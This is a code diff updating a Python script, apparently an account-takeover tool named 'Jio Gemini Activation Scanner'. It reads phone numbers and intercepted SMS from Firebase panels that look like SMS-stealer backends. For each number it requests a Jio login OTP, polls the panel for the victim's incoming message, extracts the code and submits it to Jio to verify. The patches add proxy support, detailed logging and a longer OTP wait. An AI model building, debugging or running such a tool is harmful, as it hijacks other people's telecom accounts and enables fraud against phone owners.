@@ -1,13 +1,14 @@
 """
-Jio Gemini Activation Scanner - COMPLETE EDITION (diagnostic build)
+Jio Gemini Activation Scanner - COMPLETE EDITION (diagnostic build v2)
 All panels decoded from Netlify URLs
 Flow: All Panels → Online Devices → Unique Numbers → Process Links
 
-Patches so với bản gốc:
+Patches:
   - P1: log raw response của is_jio_number / send_otp / verify_otp
   - P2: cookie warm-up trong jio_session()
   - P3: proxy support qua HTTP_PROXY / HTTPS_PROXY env
   - P4: TEST_MODE — chỉ chạy N số đầu
+  - P5: OTP_TIMEOUT = 90 + log poll chi tiết trong wait_for_otp
 """
 
 from __future__ import annotations
@@ -107,7 +108,7 @@ FIREBASE_PANELS = [
 # ==================== CONFIG ====================
 
 MESSAGE_SCAN_LIMIT = 100
-OTP_TIMEOUT = 15
+OTP_TIMEOUT = 90        # P5: tăng từ 15 → 90, đủ cho Firebase panel sync SMS
 POLL_INTERVAL = 1
 
 # P4: TEST_MODE — chỉ chạy N số đầu để debug nhanh. Đổi False khi chạy thật.
@@ -232,7 +233,6 @@ def jio_session() -> requests.Session:
     })
     if _PROXY:
         session.proxies.update({"http": _PROXY, "https": _PROXY})
-    # Warm-up: ghé homepage + login page để nhận cookies (akamai, jsessionid, ...)
     try:
         session.get("https://www.jio.com/", timeout=20)
         session.get("https://www.jio.com/selfcare/login/", timeout=20)
@@ -265,7 +265,6 @@ def is_jio_number(session: requests.Session, mobile: str) -> bool:
         print(f"  [is_jio_number] exception: {e}")
         return False
     data = response_json(response)
-    # P1: log raw
     print(f"  [is_jio_number] HTTP {response.status_code} | body: {response.text[:300]}")
     return not response_error(response) and bool(data.get("primaryService"))
 
@@ -280,7 +279,6 @@ def send_otp(session: requests.Session, mobile: str) -> bool:
     except requests.RequestException as e:
         print(f"  [send_otp] exception: {e}")
         return False
-    # P1: log raw
     print(f"  [send_otp] HTTP {response.status_code} | body: {response.text[:500]}")
     print(f"  [send_otp] cookies: {list(session.cookies.get_dict().keys())}")
     return not response_error(response)
@@ -292,7 +290,6 @@ def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
     except requests.RequestException as e:
         print(f"  [verify_otp] exception: {e}")
         return False
-    # P1: log raw
     print(f"  [verify_otp] HTTP {response.status_code} | body: {response.text[:300]}")
     return not response_error(response)
 
@@ -307,14 +304,23 @@ def message_order(key: str, item: dict[str, Any]) -> int:
 
 
 def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id: str, known_keys: set[str], jio: requests.Session, mobile: str) -> bool:
+    """P5: log chi tiết từng poll để biết panel có nhận SMS không."""
     used: set[str] = set()
-    deadline = time.monotonic() + OTP_TIMEOUT
+    start = time.monotonic()
+    deadline = start + OTP_TIMEOUT
+    print(f"  [wait_for_otp] start, timeout={OTP_TIMEOUT}s, known_keys={len(known_keys)}")
+    poll_count = 0
     while time.monotonic() < deadline:
+        poll_count += 1
         try:
             messages = latest_messages(firebase, base_url, key, device_id, 20)
-        except requests.RequestException:
+        except requests.RequestException as e:
+            print(f"  [wait_for_otp] poll#{poll_count} err: {e}")
             time.sleep(POLL_INTERVAL)
             continue
+        new_msgs = [k for k in messages if k not in known_keys and k not in used]
+        elapsed = int(time.monotonic() - start)
+        print(f"  [wait_for_otp] poll#{poll_count} @{elapsed}s | total={len(messages)} new={len(new_msgs)}")
         candidates: list[tuple[int, str, str]] = []
         for message_key, item in messages.items():
             if message_key in known_keys or message_key in used:
@@ -328,10 +334,14 @@ def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id:
         if candidates:
             _, message_key, otp = max(candidates)
             used.add(message_key)
-            print(f"  [wait_for_otp] thấy OTP {otp} từ msg {message_key}")
+            print(f"  [wait_for_otp] tìm thấy OTP {otp} từ msg {message_key}")
             if verify_otp(jio, mobile, otp):
+                print(f"  [wait_for_otp] OTP verified OK")
                 return True
+            else:
+                print(f"  [wait_for_otp] OTP verify fail, tiếp tục chờ")
         time.sleep(POLL_INTERVAL)
+    print(f"  [wait_for_otp] hết {OTP_TIMEOUT}s, không có OTP")
     return False
 
 
@@ -508,7 +518,7 @@ def main() -> int:
         print("Koi number nahi mila.")
         return 1
 
-    # P4: TEST_MODE — chỉ chạy N số đầu
+    # P4: TEST_MODE
     if TEST_MODE:
         targets = targets[:TEST_LIMIT]
         print(f"TEST_MODE ON → chỉ chạy {len(targets)} số đầu")
